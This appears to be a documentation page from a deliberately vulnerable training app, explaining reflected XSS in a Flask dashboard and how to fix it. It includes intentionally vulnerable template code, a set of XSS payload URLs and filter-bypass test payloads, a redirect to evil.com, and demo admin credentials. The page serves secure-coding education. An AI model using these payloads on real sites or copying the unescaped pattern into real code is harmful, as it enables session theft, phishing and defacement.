@@ -1,0 +1,472 @@
+---
+title: 'Cross-Site Scripting (XSS)'
+description: 'Reflected XSS vulnerability allowing JavaScript injection through unsanitized URL parameters'
+icon: 'code'
+---
+
+<Warning>
+  **Educational Purpose Only** - XSS attacks can steal user sessions, deface websites, and distribute malware. Only practice on authorized systems.
+</Warning>
+
+## Overview
+
+Cross-Site Scripting (XSS) is a vulnerability that allows attackers to inject malicious JavaScript code into web pages viewed by other users. This demo contains a **Reflected XSS** vulnerability where user input from URL parameters is rendered directly in the page without sanitization.
+
+<Card title="Severity Rating" icon="exclamation-triangle">
+  **HIGH** - CVSS Score: 7.5/10
+  
+  **CWE Reference**: [CWE-79: Improper Neutralization of Input During Web Page Generation](https://cwe.mitre.org/data/definitions/79.html)
+</Card>
+
+## Vulnerable Code
+
+The vulnerability exists in both the Flask backend and Jinja2 template:
+
+<CodeGroup>
+```python vulnerable/app.py:82-87
+@app.route('/dashboard')
+def dashboard():
+    if 'user_id' not in session:
+        return redirect('/login')
+    
+    # VULNERABLE: No sanitization of user input
+    message = request.args.get('message', '')
+    
+    return render_template('dashboard.html', 
+                         username=session.get('username'),
+                         message=message,  # Passed directly to template
+                         role=session.get('role'))
+```
+
+```html vulnerable/templates/dashboard.html:12-16
+<!-- VULNERABLE: |safe filter disables auto-escaping -->
+{% if message %}
+<div style="margin-top: 1rem; padding: 1rem; background: #fff3cd;">
+    <strong>Mensaje:</strong> {{ message|safe }}
+</div>
+{% endif %}
+```
+</CodeGroup>
+
+### Why This Is Dangerous
+
+1. **No Input Sanitization**: The `message` parameter from the URL is passed directly to the template without any filtering or encoding
+2. **Jinja2 |safe Filter**: The `|safe` filter explicitly disables Jinja2's automatic HTML escaping (`dashboard.html:14`)
+3. **User-Controlled Content**: Attackers can craft malicious URLs containing JavaScript payloads
+4. **Reflected Immediately**: The payload executes as soon as the victim loads the URL
+
+## Exploitation Steps
+
+<Steps>
+  <Step title="Authenticate to the Application">
+    First, log into the vulnerable application:
+    ```
+    URL: https://auth-vulnerable.onrender.com/login
+    Username: admin
+    Password: admin123
+    ```
+    
+    This is necessary because the dashboard route requires authentication (`vulnerable/app.py:77`).
+  </Step>
+  
+  <Step title="Craft XSS Payload">
+    Create a malicious URL with JavaScript in the `message` parameter:
+    
+    <Tabs>
+      <Tab title="Basic Alert">
+        ```url
+        https://auth-vulnerable.onrender.com/dashboard?message=<script>alert('XSS')</script>
+        ```
+        
+        **Result**: Popup alert appears, confirming JavaScript execution
+      </Tab>
+      
+      <Tab title="Cookie Theft">
+        ```url
+        https://auth-vulnerable.onrender.com/dashboard?message=<script>alert('Cookie: ' + document.cookie)</script>
+        ```
+        
+        **Result**: Displays session cookies, demonstrating how attackers can steal authentication tokens
+        
+        <Note>In a real attack, cookies would be sent to an attacker-controlled server</Note>
+      </Tab>
+      
+      <Tab title="Event Handler">
+        ```url
+        https://auth-vulnerable.onrender.com/dashboard?message=<img src=x onerror="alert('XSS')">
+        ```
+        
+        **Result**: The `onerror` event fires when the invalid image fails to load, executing the JavaScript
+      </Tab>
+      
+      <Tab title="DOM Manipulation">
+        ```url
+        https://auth-vulnerable.onrender.com/dashboard?message=<script>document.body.innerHTML='<h1>HACKED</h1>'</script>
+        ```
+        
+        **Result**: Replaces entire page content, demonstrating defacement capability
+      </Tab>
+      
+      <Tab title="Keylogger">
+        ```url
+        https://auth-vulnerable.onrender.com/dashboard?message=<script>document.onkeypress=function(e){alert('Key: '+e.key)}</script>
+        ```
+        
+        **Result**: Captures every keystroke, showing how sensitive data can be intercepted
+      </Tab>
+      
+      <Tab title="Redirect Attack">
+        ```url
+        https://auth-vulnerable.onrender.com/dashboard?message=<script>window.location='http://evil.com/phishing'</script>
+        ```
+        
+        **Result**: Redirects user to malicious site (phishing, malware, etc.)
+      </Tab>
+    </Tabs>
+  </Step>
+  
+  <Step title="Deliver Payload to Victim">
+    In a real attack scenario, the attacker would:
+    
+    1. **Craft the malicious URL** with the XSS payload
+    2. **Encode the URL** to bypass basic filters:
+       ```javascript
+       encodeURIComponent('<script>alert(1)</script>')
+       // Result: %3Cscript%3Ealert(1)%3C%2Fscript%3E
+       ```
+    3. **Deliver via**:
+       - Phishing emails
+       - Social media messages
+       - Forum posts
+       - Shortened URLs (bit.ly, etc.)
+    4. **Wait for victim to click** and execute the payload
+  </Step>
+</Steps>
+
+## Impact Analysis
+
+<CardGroup cols={2}>
+  <Card title="Confirmed in Demo" icon="check">
+    - Arbitrary JavaScript execution
+    - Access to session cookies
+    - DOM manipulation
+    - Page defacement
+    - Keylogging capability
+  </Card>
+  
+  <Card title="Real-World Risks" icon="skull">
+    - Session hijacking (cookie theft)
+    - Credential harvesting
+    - Malware distribution
+    - Phishing attacks
+    - Cryptocurrency miners
+    - Worm propagation
+  </Card>
+</CardGroup>
+
+## Types of XSS
+
+<AccordionGroup>
+  <Accordion title="Reflected XSS (This Demo)">
+    **Characteristics**:
+    - Payload comes from HTTP request (URL, form submission)
+    - Immediately reflected back in the response
+    - Requires victim to click a malicious link
+    - Not stored in the database
+    
+    **Example**: The `message` parameter in our demo
+    
+    ```python
+    message = request.args.get('message', '')  # From URL
+    return render_template('page.html', message=message)  # Immediately rendered
+    ```
+  </Accordion>
+  
+  <Accordion title="Stored XSS (Persistent)">
+    **Characteristics**:
+    - Payload stored in database
+    - Executes every time the page is loaded
+    - More dangerous (affects all users)
+    - No user interaction required after storage
+    
+    **Example**:
+    ```python
+    # Vulnerable profile update
+    bio = request.form['bio']  # Contains <script>evil</script>
+    cursor.execute("UPDATE users SET bio = ? WHERE id = ?", (bio, user_id))
+    # Later, when profile is viewed:
+    # return render_template('profile.html', bio=user.bio|safe)  # VULNERABLE
+    ```
+  </Accordion>
+  
+  <Accordion title="DOM-Based XSS">
+    **Characteristics**:
+    - Payload never reaches the server
+    - Entirely client-side JavaScript vulnerability
+    - Harder to detect with server-side tools
+    
+    **Example**:
+    ```javascript
+    // Vulnerable client-side code
+    var message = window.location.hash.substring(1);
+    document.getElementById('output').innerHTML = message;  // VULNERABLE
+    
+    // Attack URL:
+    // http://site.com/page#<img src=x onerror=alert(1)>
+    ```
+  </Accordion>
+</AccordionGroup>
+
+## Secure Implementation
+
+The secure version properly handles XSS prevention:
+
+<CodeGroup>
+```python secure/app.py:131-137
+from markupsafe import escape
+
+@app.route('/dashboard')
+def dashboard():
+    if 'user_id' not in session:
+        return redirect('/login')
+    
+    # SECURE: HTML escaping
+    message = request.args.get('message', '')
+    
+    return render_template('dashboard.html', 
+                         username=session.get('username'),
+                         message=escape(message),  # Escaped before rendering
+                         role=session.get('role'))
+```
+
+```html secure/templates/dashboard.html:12-16
+<!-- SECURE: No |safe filter, auto-escaping enabled -->
+{% if message %}
+<div style="margin-top: 1rem; padding: 1rem;">
+    <strong>Mensaje:</strong> {{ message }}
+</div>
+{% endif %}
+```
+
+```python secure/app.py:19-26 (Security Headers)
+@app.after_request
+def set_security_headers(response):
+    response.headers['X-Content-Type-Options'] = 'nosniff'
+    response.headers['X-Frame-Options'] = 'DENY'
+    response.headers['X-XSS-Protection'] = '1; mode=block'
+    response.headers['Strict-Transport-Security'] = 'max-age=31536000'
+    response.headers['Content-Security-Policy'] = "default-src 'self'"
+    return response
+```
+</CodeGroup>
+
+### How the Fix Works
+
+<Steps>
+  <Step title="HTML Entity Encoding">
+    The `escape()` function converts special characters:
+    
+    ```python
+    from markupsafe import escape
+    
+    escape('<script>alert(1)</script>')
+    # Returns: '&lt;script&gt;alert(1)&lt;/script&gt;'
+    ```
+    
+    | Character | Encoded |
+    |-----------|----------|
+    | `<` | `&lt;` |
+    | `>` | `&gt;` |
+    | `"` | `&quot;` |
+    | `'` | `&#x27;` |
+    | `&` | `&amp;` |
+  </Step>
+  
+  <Step title="Jinja2 Auto-Escaping">
+    Without the `|safe` filter, Jinja2 automatically escapes HTML:
+    
+    ```html
+    <!-- Secure: Auto-escaped -->
+    {{ message }}
+    
+    <!-- Vulnerable: Escaping disabled -->
+    {{ message|safe }}
+    ```
+  </Step>
+  
+  <Step title="Content Security Policy (CSP)">
+    CSP headers restrict JavaScript execution:
+    
+    ```python
+    response.headers['Content-Security-Policy'] = "default-src 'self'"
+    ```
+    
+    This prevents:
+    - Inline `<script>` tags
+    - `eval()` and `new Function()`
+    - Inline event handlers (`onclick`, `onerror`, etc.)
+    - Loading scripts from external domains
+  </Step>
+</Steps>
+
+## Mitigation Strategies
+
+<AccordionGroup>
+  <Accordion title="1. Output Encoding (Primary Defense)">
+    Always encode user input before rendering:
+    
+    ```python
+    # Python/Flask
+    from markupsafe import escape
+    safe_output = escape(user_input)
+    
+    # JavaScript
+    function escapeHtml(text) {
+        const map = {
+            '&': '&amp;',
+            '<': '&lt;',
+            '>': '&gt;',
+            '"': '&quot;',
+            "'": '&#x27;'
+        };
+        return text.replace(/[&<>"']/g, m => map[m]);
+    }
+    ```
+  </Accordion>
+  
+  <Accordion title="2. Content Security Policy (CSP)">
+    Implement strict CSP headers:
+    
+    ```python
+    # Strict CSP
+    response.headers['Content-Security-Policy'] = (
+        "default-src 'self'; "
+        "script-src 'self'; "
+        "style-src 'self' 'unsafe-inline'; "
+        "img-src 'self' data:; "
+        "font-src 'self'; "
+        "connect-src 'self'; "
+        "frame-ancestors 'none';"
+    )
+    ```
+  </Accordion>
+  
+  <Accordion title="3. Input Validation">
+    Validate and sanitize input:
+    
+    ```python
+    import re
+    
+    def validate_message(message):
+        # Remove HTML tags
+        clean = re.sub(r'<[^>]*>', '', message)
+        
+        # Limit length
+        if len(clean) > 200:
+            return None
+        
+        # Whitelist allowed characters
+        if not re.match(r'^[a-zA-Z0-9\s.,!?-]+$', clean):
+            return None
+        
+        return clean
+    ```
+  </Accordion>
+  
+  <Accordion title="4. HTTPOnly Cookies">
+    Prevent JavaScript access to cookies:
+    
+    ```python
+    app.config['SESSION_COOKIE_HTTPONLY'] = True
+    app.config['SESSION_COOKIE_SECURE'] = True
+    app.config['SESSION_COOKIE_SAMESITE'] = 'Strict'
+    ```
+    
+    This prevents `document.cookie` from accessing session tokens.
+  </Accordion>
+  
+  <Accordion title="5. Template Security">
+    Use template auto-escaping:
+    
+    ```python
+    # Flask/Jinja2: Auto-escaping enabled by default
+    # NEVER use |safe unless absolutely necessary
+    
+    # React: Escapes by default
+    <div>{userInput}</div>
+    
+    # Vue: Use v-text instead of v-html
+    <div v-text="userInput"></div>
+    ```
+  </Accordion>
+</AccordionGroup>
+
+## Testing and Detection
+
+### Manual Testing Payloads
+
+```html
+<!-- Basic test -->
+<script>alert(1)</script>
+
+<!-- Event handlers -->
+<img src=x onerror=alert(1)>
+<svg onload=alert(1)>
+<body onload=alert(1)>
+
+<!-- Bypass filters -->
+<ScRiPt>alert(1)</ScRiPt>
+<script>alert(String.fromCharCode(88,83,83))</script>
+
+<!-- Without script tags -->
+<img src="javascript:alert(1)">
+<iframe src="javascript:alert(1)">
+
+<!-- DOM-based -->
+<img src=x onerror="eval(atob('YWxlcnQoMSk='))">
+```
+
+### Automated Tools
+
+<CardGroup cols={2}>
+  <Card title="XSS Strike" icon="bolt">
+    ```bash
+    python3 xsstrike.py -u "http://target.com/page?param=test"
+    ```
+  </Card>
+  
+  <Card title="Burp Suite" icon="bug">
+    - Scanner: Automated XSS detection
+    - Intruder: Custom payload testing
+    - Repeater: Manual verification
+  </Card>
+  
+  <Card title="OWASP ZAP" icon="shield-halved">
+    ```bash
+    zap-cli quick-scan --spider \
+      -r "http://target.com"
+    ```
+  </Card>
+  
+  <Card title="DOMPurify" icon="broom">
+    JavaScript sanitization library:
+    ```javascript
+    import DOMPurify from 'dompurify';
+    const clean = DOMPurify.sanitize(dirty);
+    ```
+  </Card>
+</CardGroup>
+
+## References
+
+- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
+- [CWE-79: XSS](https://cwe.mitre.org/data/definitions/79.html)
+- [Content Security Policy Reference](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP)
+- [PortSwigger XSS](https://portswigger.net/web-security/cross-site-scripting)
+
+<Card title="Next Steps" icon="arrow-right">
+  Learn about related vulnerabilities:
+  - [CSRF](/vulnerabilities/csrf) - Cross-Site Request Forgery
+  - [Session Management](/vulnerabilities/session-management) - Secure session handling
+  - [Security Headers](/vulnerabilities/security-misconfiguration) - Additional security headers
+</Card>
